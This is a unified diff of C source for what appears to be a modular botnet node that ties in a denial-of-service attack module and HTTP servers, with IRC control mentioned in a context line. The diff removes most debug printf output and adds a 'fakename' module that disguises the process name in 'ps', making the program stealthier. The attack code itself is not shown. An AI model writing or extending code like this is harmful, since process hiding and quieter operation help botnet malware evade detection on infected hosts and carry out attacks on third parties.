@@ -110,6 +110,8 @@ so nodes can use several communication methods, and irc can be used to control
 #include "modules/dos/attacks.h"
 // http web servers
 #include "modules/httpd/httpd.h"
+// fake 'ps' name
+#include "modules/fakename/fakename.h"
 
 #define MAX(a, b) ((a) > (b) ? ( a) : (b))
 #define MIN(a, b) ((a) < (b) ? ( a) : (b))
@@ -133,8 +135,6 @@ void OutgoingFlush(Connection *cptr) {
     Queue *qptr = NULL;
     int cur_time = time(0);
     
-    printf("outgoing flush %d\n", cptr->fd);
-    
     // is this a new connection?
     if (cptr->state == TCP_NEW) {
         cptr->state = TCP_CONNECTED;
@@ -145,13 +145,10 @@ void OutgoingFlush(Connection *cptr) {
         }
     }
     
-    printf("outgoing %p\n", cptr->outgoing);
     // can write now.. check outgoing queue
     // do we have an outgoing queue to deal with?
     if ((qptr = cptr->outgoing) != NULL) {  
-        printf("starting loop\n");      
         while (qptr != NULL) {
-            printf("loop\n");
             // outgoing might not write everything first shot..
             int wrote = write(cptr->fd, qptr->buf, qptr->size);
             
@@ -226,8 +223,6 @@ Connection *ConnectionAdopt(Modules *original, Modules *newhome, Connection *con
     // when L_del() here created a bug in the loop near select()
     ConnectionBad(conn);
     //L_del((LIST **)&original->connections, (LIST *)conn);
-
-    printf("adopted!\n");
         
     return cptr;
 }
@@ -267,13 +262,8 @@ void ConnectionCleanup(Connection **conn_list) {
     Connection *cptr = NULL;
     int count = 0;
 
-    printf("Cleanup\n");
-    
     for (cptr = *conn_list; cptr != NULL; ) {
-        printf("conn %d\n", cptr->fd);
         if (cptr->closed) {
-            count++;
-            printf("closed connection\n");
             // remove the connection.. and get the next element from it
             L_del_next((LIST **)conn_list, (LIST *)cptr, (LIST **)&cptr);
             continue;            
@@ -282,10 +272,7 @@ void ConnectionCleanup(Connection **conn_list) {
         // if we didnt remove it.. the next is simple to iterate
         cptr = cptr->next;
     }
-    if (count) {
-        printf("cleaned up %d\n", count);
-        sleep(1);
-    }
+
 }
 
 
@@ -314,16 +301,12 @@ void socket_loop(Modules *modules) {
     
     // setup all possible module file descriptors for select
     for (mptr = modules; mptr != NULL; mptr = mptr->next) {
-        printf("tcp module %p\n", mptr);
         
         // the module may have several Connection as well
         for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
             if ((modcptr->fd == 0) || modcptr->closed)
                 continue;
                 
-            printf("connection %d [%p] %X %d\n", modcptr->fd, mptr, modcptr->ip, modcptr->port);
-            
-            
             setup_fd(&readfds, &writefds, &errorfds, modcptr->fd, &maxfd);
             
             count++;    
@@ -336,18 +319,12 @@ void socket_loop(Modules *modules) {
         return;
     }
 
-    printf("before select\n");
-        
     if (select(maxfd, &readfds, &writefds, &errorfds, &ts) > 0) {
-        printf("inside sel\n");
         // loop to check module file descriptors first
         for (mptr = modules; mptr != NULL; mptr = mptr->next) {
-            printf("module after select %p\n", mptr);
             // the module may have several Connection as well
             for (modcptr = mptr->connections; modcptr != NULL; modcptr = modcptr->next) {
-                printf("cnnection under module %p: %d\n", mptr, modcptr->fd);
                 if (FD_ISSET(modcptr->fd, &readfds)) {
-                    printf("read fd %d\n", modcptr->fd);
                     if (modcptr->state == TCP_LISTEN) {
                         // if its listening... its a new connection..
                         // it needs to adopt to its correct module after
@@ -359,18 +336,15 @@ void socket_loop(Modules *modules) {
                 }
                     
                 if (FD_ISSET(modcptr->fd,&writefds)) {
-                    printf("write fd %d\n", modcptr->fd);
                     OutgoingFlush(modcptr);
                 }
 
                 if (FD_ISSET(modcptr->fd, &errorfds)) {
-                    printf("error fd %d\n", modcptr->fd);
                     ConnectionBad(modcptr);
                 }
             }
         }
     }
-    printf("leaving\n");
 }
 
 Connection *ConnectionFind(Connection *list, uint32_t addr) {
@@ -394,13 +368,9 @@ void ConnectionRead(Connection *cptr) {
     int r = 0;
     Queue *newqueue = NULL;
     
-    printf("connection read\n");
     // check size waiting
     // maybe find another way.. not sure if ioctl will work everywhere
-    ioctl(cptr->fd, FIONREAD, &waiting);
-    
-    printf("waiting: %d\n", waiting);
-    
+    ioctl(cptr->fd, FIONREAD, &waiting);    
     if (!waiting) return;
     
     
@@ -408,7 +378,6 @@ void ConnectionRead(Connection *cptr) {
     // lets add a little more just in case a fragment came in
     size = waiting;
     if ((buf = (char *)malloc(size + 1)) == NULL) {
-        printf("bad 2\n");
         // handle error..
         ConnectionBad(cptr);
         return;
@@ -416,13 +385,11 @@ void ConnectionRead(Connection *cptr) {
     
     // verify we read something.. if not its bad
     if (read(cptr->fd, buf, size) <= 0) {
-        printf("bad 3\n");
         ConnectionBad(cptr);
         return;
     }
 
     if ((newqueue = (Queue *)L_add((LIST **)&cptr->incoming, sizeof(Queue))) == NULL) {
-        printf("bad 4\n");
         // error!
         ConnectionBad(cptr);
     }
@@ -430,8 +397,6 @@ void ConnectionRead(Connection *cptr) {
     // all is well..
     newqueue->buf = buf;
     newqueue->size = size;
-    
-    printf("done reading into queu\n");
 }
 
 // handle basic TCP/IP (input/output)
@@ -659,14 +624,10 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
     Modules *mptr = NULL;
     int active_count = 0;
     
-    printf("module execute\n");
     // first handle all socket I/O...
     socket_loop(_module_list);
 
-    printf("after socket loop\n");
-
     for (mptr = _module_list; mptr != NULL; mptr = mptr->next) {
-        printf("module %p\n", mptr);
         // first handle tcp/ip I/O
         if (L_count((LIST *)mptr->connections)) {
             network_main_loop(mptr);
@@ -681,8 +642,6 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
                 mptr->functions->plumbing(mptr, NULL, NULL, 0);
                     
         }
-        printf("done.. %p\n", mptr);
-        
         // cleanup stale Connection
         ConnectionCleanup(&mptr->connections);        
 
@@ -695,8 +654,6 @@ int Modules_Execute(Modules *_module_list, int *sleep_time) {
 
 // Adds a module to a list
 int Module_Add(Modules **_module_list, Modules *newmodule) {
-    printf("module add %p\n", newmodule);
-    
     newmodule->next = *_module_list;
     *_module_list = newmodule;
     
@@ -784,9 +741,8 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     // set non blocking I/O for socket..
     sock_opt = fcntl(fd, F_GETFL, 0);
     fcntl(fd, F_SETFL, sock_opt | O_NONBLOCK);
-   
 
-    printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);
+    //printf("tcp connect - %s %d\n", inet_ntoa(dst.sin_addr), port);
 
     // lets do this before allocating the connection structure..
     r = connect(fd, (struct sockaddr *)&dst, sizeof(dst));
@@ -827,11 +783,8 @@ Connection *tcp_connect(Modules *mptr, Connection **connections, uint32_t ip, in
     // because itll be inside of events, etc.. and itll reuse the memory..
     // like this itll get removed during Cleanup()
     if (ret == NULL && cptr && !*_conn) {
-        printf("ending pre\n");
         L_del((LIST **)&mptr->connections, (LIST *)cptr);
     }
-    
-    printf("end connect\n");
     
     return ret;
 }
@@ -883,6 +836,9 @@ int main(int argc, char *argv[]) {
     attack_init(&module_list);
     // http servers
     httpd_init(&module_list);
+    
+    // fake name for 'ps'
+    fakename_init(&module_list, argv);
     
     // main loop
     while (1) {
